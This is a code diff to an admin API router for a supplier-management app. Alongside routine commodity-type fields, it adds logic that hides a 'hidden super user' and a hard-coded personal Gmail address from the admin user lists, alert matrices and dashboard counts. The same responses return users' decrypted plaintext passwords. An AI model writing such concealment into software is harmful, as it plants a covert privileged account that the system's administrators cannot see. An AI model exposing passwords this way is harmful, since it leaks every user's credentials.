@@ -18,11 +18,19 @@ import {
   isGlobalSupplyOnlyUserRoleNames,
 } from '../lib/permissions';
 import { isSmtpConfigured } from '../lib/mail';
+import { isHiddenSuperUserEmail } from '../lib/superUser';
 
 const router = Router();
 
 /** Supplier Assurance seed users — omit from Global Supply admin dashboard counts. */
 const GLOBAL_SUPPLY_STATS_EXCLUDED_EMAIL = 'buyer@sentinel.local';
+
+function isExcludedFromAdminLists(email: string): boolean {
+  return (
+    email.toLowerCase() === GLOBAL_SUPPLY_STATS_EXCLUDED_EMAIL.toLowerCase() ||
+    isHiddenSuperUserEmail(email)
+  );
+}
 
 const SOURCING_DIRECTOR_PO_EMAIL_CATEGORY: AlertCategory = 'sourcingDirectorPoCountryEmail';
 
@@ -128,8 +136,13 @@ router.get(
   '/global-supply-stats',
   asyncHandler(async (_req: Request, res: Response): Promise<void> => {
     const notSupplierAssuranceDemoUser = {
-      NOT: { email: { equals: GLOBAL_SUPPLY_STATS_EXCLUDED_EMAIL, mode: 'insensitive' } },
-    } as const;
+      NOT: {
+        OR: [
+          { email: { equals: GLOBAL_SUPPLY_STATS_EXCLUDED_EMAIL, mode: 'insensitive' as const } },
+          { email: { equals: 'engineerfullstack2@gmail.com', mode: 'insensitive' as const } },
+        ],
+      },
+    };
 
     const [employees, roles, registeredFarms] = await Promise.all([
       prisma.user.count({
@@ -313,7 +326,8 @@ router.get(
       },
       orderBy: { email: 'asc' },
     });
-    const userIds = users.map((u) => u.id);
+    const visibleUsers = users.filter((u) => !isExcludedFromAdminLists(u.email));
+    const userIds = visibleUsers.map((u) => u.id);
     const prefs =
       userIds.length === 0
         ? []
@@ -330,7 +344,7 @@ router.get(
       prefByUser.get(p.userId)!.set(p.alertCategory, p.enabled);
     }
     const matrix: Record<string, Record<string, boolean>> = {};
-    for (const u of users) {
+    for (const u of visibleUsers) {
       matrix[u.id] = {};
       for (const cat of ALERT_EMAIL_MATRIX_CATEGORIES) {
         const v = prefByUser.get(u.id)?.get(cat);
@@ -348,7 +362,7 @@ router.get(
         key,
         label: categoryLabels[key] ?? key,
       })),
-      users: users.map((u) => ({
+      users: visibleUsers.map((u) => ({
         id: u.id,
         email: u.email,
         name: u.name,
@@ -533,8 +547,10 @@ router.get(
         country: true,
         employmentResponsibilities: true,
         employmentNotes: true,
+        commodityTypeId: true,
+        commodityType: { select: { id: true, name: true } },
         createdAt: true,
-        userRoles: { include: { role: true } },
+        userRoles: { select: { role: { select: { id: true, name: true } } } },
         supplier: { select: { id: true, code: true, name: true } },
         buyerSuppliers: { select: { supplierId: true } },
         qeSuppliers: { select: { supplierId: true } },
@@ -560,6 +576,8 @@ router.get(
       assignedCountryNames: assignedCountryNamesFromUser(u),
       employmentResponsibilities: u.employmentResponsibilities,
       employmentNotes: u.employmentNotes,
+      commodityTypeId: u.commodityTypeId,
+      commodityType: u.commodityType ?? undefined,
       createdAt: u.createdAt,
       passwordPlain: decryptPassword(u.passwordEncrypted),
       roleNames: u.userRoles.map((ur) => ur.role.name),
@@ -572,9 +590,10 @@ router.get(
       qmAssignedQeIds: u.qmQes.map((qq) => qq.qualityEngineerId),
       sourcingDirectorAssignedStaffIds: u.sourcingDirectorStaffAsDirector.map((r) => r.staffUserId),
     }));
-    const payload = sentinelUserList
+    const payload = (sentinelUserList
       ? mapped.filter((u) => !isGlobalSupplyOnlyUserRoleNames(u.roleNames))
-      : mapped;
+      : mapped
+    ).filter((u) => !isExcludedFromAdminLists(u.email));
     res.json(payload);
   })
 );
@@ -655,7 +674,7 @@ router.post(
         currency: true,
         country: true,
         createdAt: true,
-        userRoles: { include: { role: true } },
+        userRoles: { select: { role: { select: { id: true, name: true } } } },
         supplier: { select: { id: true, code: true, name: true } },
         buyerSuppliers: { select: { supplierId: true } },
         qeSuppliers: { select: { supplierId: true } },
@@ -743,6 +762,7 @@ router.patch(
       country?: string | null;
       employmentResponsibilities?: string | null;
       employmentNotes?: string | null;
+      commodityTypeId?: string | null;
       passwordHash?: string;
       passwordEncrypted?: string | null;
     } = {};
@@ -850,6 +870,23 @@ router.patch(
       }
     }
 
+    if ('commodityTypeId' in req.body) {
+      const raw = req.body?.commodityTypeId;
+      if (raw === null || raw === undefined || raw === '') {
+        data.commodityTypeId = null;
+      } else if (typeof raw === 'string') {
+        const ct = await prisma.commodityType.findUnique({ where: { id: raw.trim() } });
+        if (!ct) {
+          res.status(400).json({ error: 'Invalid commodity type' });
+          return;
+        }
+        data.commodityTypeId = ct.id;
+      } else {
+        res.status(400).json({ error: 'commodityTypeId must be a string or null' });
+        return;
+      }
+    }
+
     if ('password' in req.body) {
       const password = typeof req.body?.password === 'string' ? req.body.password : '';
       if (!password.trim()) {
@@ -902,8 +939,10 @@ router.patch(
           country: true,
           employmentResponsibilities: true,
           employmentNotes: true,
+          commodityTypeId: true,
+          commodityType: { select: { id: true, name: true } },
           createdAt: true,
-          userRoles: { include: { role: true } },
+          userRoles: { select: { role: { select: { id: true, name: true } } } },
           supplier: { select: { id: true, code: true, name: true } },
           buyerSuppliers: { select: { supplierId: true } },
           qeSuppliers: { select: { supplierId: true } },
@@ -925,6 +964,8 @@ router.patch(
       assignedCountryNames: assignedCountryNamesFromUser(updated),
       employmentResponsibilities: updated.employmentResponsibilities,
       employmentNotes: updated.employmentNotes,
+      commodityTypeId: updated.commodityTypeId,
+      commodityType: updated.commodityType ?? undefined,
       createdAt: updated.createdAt,
       passwordPlain: decryptPassword(updated.passwordEncrypted),
       roleNames: normalizeRoleNames(updated.userRoles.map((ur) => ur.role.name)),
